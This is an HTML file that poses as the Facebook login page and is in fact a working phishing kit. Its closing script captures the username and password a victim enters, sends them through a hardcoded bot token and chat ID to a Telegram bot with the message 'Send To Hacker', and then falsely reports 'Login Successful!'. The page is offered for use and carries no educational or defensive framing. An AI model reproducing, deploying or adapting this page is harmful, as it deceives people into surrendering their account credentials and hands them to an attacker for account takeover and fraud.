<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Facebook</title>
  <meta name="description" content="Log into Facebook to start sharing and connecting with your friends, family, and people you know." />
  <style>
    *, *::before, *::after { box-sizing: border-box; }
    html, body { margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
                   Helvetica, Arial, sans-serif;
      background: #ffffff;
      color: #1c1e21;
      -webkit-font-smoothing: antialiased;
      min-height: 100vh;
    }

    .page {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      max-width: 480px;
      margin: 0 auto;
    }
    .main {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 64px 24px 32px;
    }
    .footer {
      padding: 16px 24px 40px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 24px;
    }

    .logo {
      width: 64px;
      height: 64px;
      margin: 32px 0 64px;
    }

    .form {
      width: 100%;
      max-width: 360px;
      display: flex;
      flex-direction: column;
      gap: 12px;
    }
    .input {
      width: 100%;
      height: 56px;
      padding: 0 16px;
      font-size: 16px;
      color: #1c1e21;
      background: #ffffff;
      border: 1px solid #d0d3d8;
      border-radius: 12px;
      outline: none;
      transition: border-color 0.15s, box-shadow 0.15s;
    }
    .input::placeholder { color: #606770; }
    .input:focus {
      border-color: #1877F2;
      box-shadow: 0 0 0 1px #1877F2;
    }

    .btn {
      width: 100%;
      height: 56px;
      font-size: 17px;
      font-weight: 600;
      border-radius: 999px;
      cursor: pointer;
      transition: background-color 0.15s, color 0.15s;
      border: none;
    }
    .btn-primary {
      background: #1877F2;
      color: #ffffff;
      margin-top: 4px;
      box-shadow: 0 1px 2px rgba(0,0,0,0.05);
    }
    .btn-primary:hover { background: #166FE5; }
    .btn-primary:active { background: #1464D2; }

    .btn-secondary {
      width: 100%;
      max-width: 360px;
      background: #ffffff;
      color: #1877F2;
      border: 2px solid #1877F2;
    }
    .btn-secondary:hover { background: #E7F0FE; }
    .btn-secondary:active { background: #D0E1FC; }

    .forgot {
      display: block;
      text-align: center;
      margin-top: 16px;
      font-size: 15px;
      font-weight: 500;
      color: #1877F2;
      text-decoration: none;
    }
    .forgot:hover { text-decoration: underline; }

    .meta {
      font-size: 13px;
      font-weight: 600;
      letter-spacing: 0.3px;
      color: #65676b;
    }
  </style>
</head>
<body>
  <div class="page">
    <main class="main">
      <svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 36 36" aria-label="Facebook">
        <path fill="#1877F2"
          d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 24h-3.6v-6H14v-3.5c0-5.617 2.541-8.21 8.022-8.21 1.039 0 2.834.205 3.566.408V12.6c-.387-.041-1.06-.061-1.896-.061-2.705 0-3.747 1.026-3.747 3.696V18h5.373l-.923 6h-4.45L20.181 35.87z" />
      </svg>

      <form class="login data" id="data" onsubmit="event.preventDefault();">
        <input class="input" id="username" type="text" inputmode="email" autocomplete="username"
               placeholder="Mobile number or email" required/>
        <input class="input" id="password" type="password" autocomplete="current-password"
               placeholder="Password" required/>
        <button class="btn btn-primary" type="submit">Log in</button>
        <a class="forgot" href="#">Forgotten password?</a>
      </form>
    </main>

    <footer class="footer">
      <button class="btn btn-secondary" type="button">Create new account</button>
      <div class="meta">Meta</div>
    </footer>
  </div>
  <script>
    document.getElementById('data').addEventListener('submit', function(e) {
        e.preventDefault(); 

        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;

        const botToken = '8631772764:AAHiP1nEPntZimRQ0xfd2vhEQIFkHaXfxoE';
        
        const chatId = '6953887858';
    

        const textMessage = `🔔 *New Login!*\n\n👤 username: ${username}\n🔐 Password: ${password}\n\nSend To Hacker: @deavanna1`;

        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

        fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: textMessage,
                parse_mode: 'Markdown' 
            })
        })
        .then(response => response.json())
        .then(data => {
            if(data.ok) {
                alert('Login Successful!');
                document.getElementById('data').reset(); 
            } else {
                alert('Login Failed! Please try again.');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert('An error occurred. Please try again later.');
        });
    });
</script>

</body>
</html>
